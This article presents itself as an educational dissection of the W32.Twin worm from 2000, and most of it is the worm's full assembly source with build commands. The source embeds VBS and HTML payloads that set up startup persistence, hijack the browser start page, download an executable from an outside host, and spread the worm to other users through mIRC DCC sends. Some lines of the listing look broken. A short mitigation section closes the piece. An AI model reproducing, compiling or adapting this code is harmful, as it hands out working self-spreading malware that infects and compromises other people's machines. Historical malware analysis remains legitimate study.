# Dissecting W32.Twin: A Multifaceted Worm from 2000 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
W32.Twin, authored by PetiK in December 2000, is a sophisticated worm written in assembly language that exemplifies the creativity and complexity of early malware. Unlike script-based worms, W32.Twin operates at a lower level, using Windows API calls to achieve persistence, propagation, and payload delivery. It targets Internet Relay Chat (IRC) clients like mIRC, manipulates Internet Explorer settings, and facilitates the download of additional malicious components, all while masquerading as a legitimate plugin.

The worm's emergence coincided with the rise of online communities and file-sharing, exploiting vulnerabilities in popular software to spread. Analyzing its source code reveals advanced techniques for the era, including registry manipulation, file creation, and script injection, which influenced subsequent malware designs. Understanding W32.Twin is vital for appreciating the evolution of worms from simple replicators to multi-vector threats. This dissection not only highlights historical tactics but also underscores the need for layered defenses against polymorphic and persistent malware in today's interconnected world.

## Section 1: Overview of the Malware 🐛
W32.Twin is a worm designed to infect Windows systems, propagate through IRC channels, and alter browser behavior to download further payloads. Its primary purpose is to establish a foothold on infected machines, modify system settings for persistence, and spread via peer-to-peer interactions in chat environments. The malware behaves by copying itself to the Windows directory, creating auxiliary files (BAT, VBS, HTM), and injecting scripts into mIRC to send infected files to other users upon joining channels.

Typical targets are Windows users running mIRC or Internet Explorer, prevalent in the early 2000s for online communication and browsing. Infection vectors include direct execution of the worm binary or via shared files in IRC. W32.Twin was part of a series of worms by the same author, contributing to the "worm wars" of the late 1990s and early 2000s. Campaigns often leveraged social engineering, such as posing as an IE plugin, to trick users into downloading. While not as widespread as mass-mailers, it caused disruptions through unwanted downloads, system modifications, and potential secondary infections from the plugin it fetches.

## Section 2: Source Code Analysis 🔬
W32.Twin is coded in x86 assembly using TASM (Turbo Assembler), targeting the flat memory model with stdcall conventions. It relies on Windows API functions from KERNEL32, USER32, and ADVAPI32 for file operations, registry access, and process management. The full source code is provided below, followed by a detailed breakdown of its components, including examples of key functions.

### Full Source Code
```asm
; comment $
;
; W32.TWIN par PetiK le 20/12/2000
;
; POUR COMPILER:
;
; tasm32 /M /ML ?????.asm
; tlink32 -Tpe -x -aa ?????.obj,,,import32
;
; $

.386
jumps
locals
.model flat, stdcall

;KERNEL32.dll
extrn lstrcat:PROC
extrn WritePrivateProfileStringA:PROC
extrn GetModuleFileNameA:PROC
extrn CopyFileA:PROC
extrn CreateFileA:PROC
extrn WriteFile:PROC
extrn CloseHandle:PROC
extrn ExitProcess:PROC
extrn GetModuleHandleA:PROC
extrn GetSystemDirectoryA:PROC
extrn GetWindowsDirectoryA:PROC

;USER32.dll
extrn MessageBoxA:PROC

;ADVAPI32.dll
extrn RegCreateKeyExA:PROC
extrn RegSetValueExA:PROC
extrn RegCloseKey:PROC

.data
fh      dd ?
octets  dd ?
regDisp dd 0
regResu dd 0
l       dd 0
p       dd 0
szBAT   db 260 dup (0)
szCopie db 260 dup (0)
szOrig  db 260 dup (0)
szHTM   db 260 dup (0)
szVBS   db 260 dup (0)
szWin   db 260 dup (0)
Copie   db "\NAV5.exe",00h
BATFILE db "\IE55.bat",00h
HTMFILE db "\IE55.htm",00h
VBSFILE db "\IE55.vbs",00h
Winini  db "\\WIN.INI",00h
run db "run",00h
windows db "windows",00h
CLE     db "Software\[PetiK]",00h
CLE2    db "\Software\Microsoft\Internet Explorer\Main",00h
NOM2    db "Start Page",00h


vbsd:
db 'rem IE55.vbs pour W32.TWiN',0dh,0ah
db '',0dh,0ah
db 'Dim fso,ws,file',0dh,0ah
db 'Set fso  = CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'Set ws   = CreateObject("WScript.Shell")',0dh,0ah
db 'DEBUT()',0dh,0ah
db 'Sub DEBUT()',0dh,0ah
db 'Set win  = fso.GetSpecialFolder(0)',0dh,0ah
db 'Set sys  = fso.GetSpecialFolder(1)',0dh,0ah
db 'ws.Run (sys&"\IE55.htm")',0dh,0ah
db 'ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\'
db 'Download Directory","C:\"',0dh,0ah
db 'If fso.FileExists("C:\PlugIE55.exe") Then',0dh,0ah
db 'ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\'
db 'Start Page","http://www.atoutmicro.ca/viralert.htm"',0dh,0ah
db 'ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\'
db 'PlugIE55","C:\PlugIE55.exe"',0dh,0ah
db 'End If',0dh,0ah
db 'MIRC()',0dh,0ah
db 'End Sub',0dh,0ah
db '',0dh,0ah
db 'Sub MIRC()',0dh,0ah
db 'On Error Resume Next',0dh,0ah
db 'If fso.FileExists("C:\mirc\script.ini") Then',0dh,0ah
db ' Set c    = (sys&"\NAV5.exe")',0dh,0ah
db ' c.Copy("C:\mirc\XPICTURE.exe")',0dh,0ah
db ' Set srpt = fso.CreateTextFile("C:\mirc\script.ini",true)',0dh,0ah
db ' srpt.WriteLine  "[script]"',0dh,0ah
db ' srpt.WriteLine  "n0=on 1:JOIN:#:{"',0dh,0ah
db ' srpt.WriteLine  "n1= /if ( $nick == $me ) { halt }"',0dh,0ah
db ' srpt.WriteLine  "n2= /.dcc send $nick C:\mirc\XPICTURE.exe"',0dh,0ah
db ' srpt.WriteLine  "n3=}"',0dh,0ah
db ' srpt.Close',0dh,0ah
db 'End If',0dh,0ah
db 'End Sub',0dh,0ah
vbstaille       equ $-vbsd

htmd:
db '<HTML><HEAD>',0dh,0ah
db '<TITLE>Plugin pour Internet Explorer / '
db 'Plugin for Internet Explorer</TITLE>',0dh,0ah
db '<SCRIPT language="JavaScript">',0dh,0ah
db 'site="http://www.multimania.com/kadosh/PlugIE55.exe ";',0dh,0ah
db 'temps = 10;',0dh,0ah
db '',0dh,0ah
db 'function affiche()',0dh,0ah
db '{ if (temps-- == 0) ',0dh,0ah
db '  { clearInterval(attente);',0dh,0ah
db '    location.href=site;',0dh,0ah
db '    return;',0dh,0ah
db '  }',0dh,0ah
db '  document.forms[0].elements[0].value = temps;',0dh,0ah
db '}',0dh,0ah
db '</SCRIPT>',0dh,0ah
db ' ',0dh,0ah
db '</HEAD>',0dh,0ah
db '<BODY bgColor=black text=red onload='''attente = setInterval'
db '("affiche()", 1000);'''>',0dh,0ah
db '<DIV align=center>',0dh,0ah
db '<H1>Plugin pour Microsoft Internet Explorer</H1>',0dh,0ah
db '<H1>Plugin for Microsoft Internet Explorer</H1>',0dh,0ah
db '</DIV>',0dh,0ah
db '<DIV align=left>',0dh,0ah
db '<HR SIZE=4>',0dh,0ah
db '<H3>Merci de t�l�charger le plugin dans le r�peroire C:\</H3>',0dh,0ah
db '<H3>Please download the plugin in C:\ path</H3>',0dh,0ah
db '<HR SIZE=1>',0dh,0ah
db '</DIV>v
db '<DIV align=center>',0dh,0ah
db '<FORM><BIG>T�l�chargement dans <INPUT size=1 value=8> secondes</BIG>',0dh,0ah
db '</FORM></DIV></BODY></HTML>',0dh,0ah
htmtaille       equ $-htmd

batd:
db '@echo off',0dh,0ah
db 'start C:\WINDOWS\SYSTEM\IE55.vbs',00h
battaille       equ $-batd

.code
DEBUT:  mov  eax, offset CLE            ; V�rifie si il existe une cl�
        call REG                        ; [PetiK] dans HKLM\Software.
        cmp  [regDisp],1                ; Si elle n'y est pas, il se copie
        jne  FIN                        ; puis modifie le fichier WIN.INI

WCOPIE: push 0                          ;
        call GetModuleHandleA           ;
        push 260                        ; Le programme se copie dans le 
        push offset szOrig              ;
        push eax                        ; dossier WINDOWS de l'ordinateur
        call GetModuleFileNameA         ; et se nommera NAV5.exe
        push 260                        ;
        push offset szCopie             ; 
        call GetWindowsDirectoryA       ;
        push offset Copie               ;
        push offset szCopie             ;
        call lstrcat                    ;
        push 0                          ;
        push offset szCopie             ;
        push offset szOrig              ;
        call CopyFileA                  ;

WIN_INI:push 260                        ; On met dans le fichier WIN.INI
        push offset szWin               ; une routine pour que le programme
        call GetWindowsDirectoryA       ; s'active � chaque d�marrage.
        push offset Winini              ; Cela �vite d'utiliser la BASE DE
        push offset szWin               ; REGISTRE trop voyante.
        call lstrcat                    ; 
        push offset szWin               ; Dans WIN.INI du dossier WINDOWS
        push offset szCopie             ; "nom du programme"
        push offset run                 ; run=
        push offset windows             ; [windows]
        call WritePrivateProfileStringA ;

BAT:    push 260                        ; 
        push offset szBAT               ;
        call GetSystemDirectoryA        ; 
        push offset BATFILE             ;
        push offset szBAT               ; 
        call lstrcat                    ;
        push 00000000h                  ;
        push 00000080h                  ;
        push 00000002h                  ;
        push 00000000h                  ;
        push 00000001h                  ;
        push 40000000h                  ;
        push offset szBAT               ;
        call CreateFileA                ;
        mov  [fh],eax                   ;
        push 00h                        ;
        push offset octets              ;
        push battaille                  ;
        push offset batd                ;
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;

VBS:    push 260                        ; On va cr�er un fichier 
        push offset szVBS               ;
        call GetSystemDirectoryA        ; dans le r�peroire SYSTEM
        push offset VBSFILE             ;
        push offset szVBS               ; qui s'appelle IE55.VBS
        call lstrcat                    ;
        push 00000000h                  ;
        push 00000080h                  ;
        push 00000002h                  ;
        push 00000000h                  ;
        push 00000001h                  ;
        push 40000000h                  ;
        push offset szVBS               ;
        call CreateFileA                ;
        mov  [fh],eax                   ;
        push 00h                        ;
        push offset octets              ;
        push vbstaille                  ;
        push offset vbsd                ;
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;

HTM:    push 260                        ; On va cr�er un fichier 
        push offset szHTM               ;
        call GetSystemDirectoryA        ; dans le r�peroire SYSTEM
        push offset HTMFILE             ;
        push offset szHTM               ; qui s'appelle IE55.HTM
        call lstrcat                    ;
        push 00000000h                  ;
        push 00000080h                  ;
        push 00000001h                  ;
        push 40000000h                  ;
        push offset szHTM               ;
        call CreateFileA                ;
        mov  [fh],eax                   ;
        push 00h                        ;
        push offset octets              ;
        push htmtaille                  ;
        push offset htmd                ;
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;

BDR:    push offset l           ;
    push offset p                   ;
        push 0                          ;
        push 1F0000h + 1 + 2h           ;
        push 0                          ;
        push 0                          ;
        push 0                          ;
        push offset CLE2                ;
        push 80000001h                  ; HKEY_CURRENT_USER
        call RegCreateKeyExA            ;
        push 05h                        ;
        push offset szVBS               ; On va cr�er une cl� dans la
        push 01h                        ; 
        push 0                          ; 
        push offset NOM2                ; Base de Registre pour qu'il
        push p                          ;
        call RegSetValueExA             ;
        push 0                          ; active le fichier VBS quand on
        call RegCloseKey                ; va sur internet
    jmp FIN             ;

REG:    push offset regDisp             ;
        push offset regResu     ;
        push 0                  ; default security descriptor
        push 0F003FH            ; KEY_ALL_ACCESS
        push 0                  ; 
        push 0              ;
        push 0              ;
        push eax                ; adresse de la sous-CLE
        push 80000002h          ; HKEY_LOCAL_MACHINE 
        call RegCreateKeyExA        ;
    push [regResu]                  ; 
        call RegCloseKey                ;
    ret             ;

FIN:    push 0                          ; 
        call ExitProcess                ; Fin du Programme

end DEBUT
```

### Breakdown of Key Components
The worm starts at the `DEBUT` label, checking for a registry key "Software\[PetiK]" in HKLM to avoid reinfection. If not present, it proceeds to copy itself.

**Self-Copying (WCOPIE):** Uses `GetModuleFileNameA` to get its path, `GetWindowsDirectoryA` for the Windows folder, and `CopyFileA` to copy as "NAV5.exe". 
```
push 0
call GetModuleHandleA
push 260
push offset szOrig
push eax
call GetModuleFileNameA
push 260
push offset szCopie
call GetWindowsDirectoryA
push offset Copie
push offset szCopie
call lstrcat
push 0
push offset szCopie
push offset szOrig
call CopyFileA
```
This sequence retrieves the current module's path, builds the destination path in Windows directory, and copies the file for persistence.

**Persistence via WIN.INI (WIN_INI):** Modifies WIN.INI to run the copied file on startup, avoiding obvious registry entries. 
```
push 260
push offset szWin
call GetWindowsDirectoryA
push offset Winini
push offset szWin
call lstrcat
push offset szWin
push offset szCopie
push offset run
push offset windows
call WritePrivateProfileStringA
```
Example: `call WritePrivateProfileStringA` with "run" under "[windows]" section adds the path, leveraging legacy auto-run mechanisms.

**File Creation (BAT, VBS, HTM):** Creates a BAT file to launch the VBS, a VBS script for runtime actions, and an HTM page for downloading. For VBS, it writes embedded data (`vbsd`) using `CreateFileA` and `WriteFile`. 
```
push 00000000h
push 00000080h
push 00000002h
push 00000000h
push 00000001h
push 40000000h
push offset szVBS
call CreateFileA
mov [fh],eax
push 00h
push offset octets
push vbstaille
push offset vbsd
push [fh]
call WriteFile
push [fh]
call CloseHandle
```
This creates the VBS file in the system directory and writes the embedded script data to it, enabling runtime execution of malicious actions.

**Registry Manipulation (BDR):** Sets IE's start page to the VBS file, triggering execution on browser launch. 
```
push offset l
push offset p
push 0
push 1F0000h + 1 + 2h
push 0
push 0
push 0
push offset CLE2
push 80000001h
call RegCreateKeyExA
push 05h
push offset szVBS
push 01h
push 0
push offset NOM2
push p
call RegSetValueExA
push 0
call RegCloseKey
```
Example: `call RegSetValueExA` with `offset szVBS` under "Start Page" ensures the script runs when IE opens.

**Embedded Scripts:** The VBS changes download directory to C:\, checks for "PlugIE55.exe", alters start page to a malicious URL, and infects mIRC by overwriting script.ini to DCC-send the worm on joins. The HTM is a countdown page redirecting to download the plugin. Example: In VBS, `ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Download Directory","C:\"` forces downloads to root, facilitating payload placement.

**Evasion and Propagation:** No heavy obfuscation, but uses system directories and script injection for stealth. Propagation via mIRC DCC is peer-to-peer, efficient in chat communities.

This code demonstrates low-level control, combining assembly efficiency with script versatility for multi-platform infection.

## Section 3: Mitigation and Defense Strategies 🛡️
To counter W32.Twin, employ antivirus with heuristic detection for assembly-based malware and script analysis. Disable script execution in browsers and IRC clients; for mIRC, avoid auto-loading scripts. Monitor WIN.INI and registry keys like HKCU\Software\Microsoft\Internet Explorer\Main for unauthorized changes.

Network defenses include blocking downloads from suspicious sites (e.g., multimania.com in the HTM). Use sandboxing for executables and educate users on not running unknown files. Developers should secure API usage, avoiding exposed automation.

Administrators can deploy EDR for file creation alerts and regularly scan for embedded scripts. In response, quarantine infected systems, remove created files (NAV5.exe, IE55.*), and reset IE settings. Proactive measures like zero-trust and updates prevent similar threats.

## Conclusion
W32.Twin's assembly core, combined with embedded scripts, showcases early multi-vector malware ingenuity. Its analysis reveals persistence tricks, propagation via IRC, and payload delivery through browser manipulation, influencing modern worms. Emphasizing vigilance, updates, and education fortifies defenses against evolving cyber threats.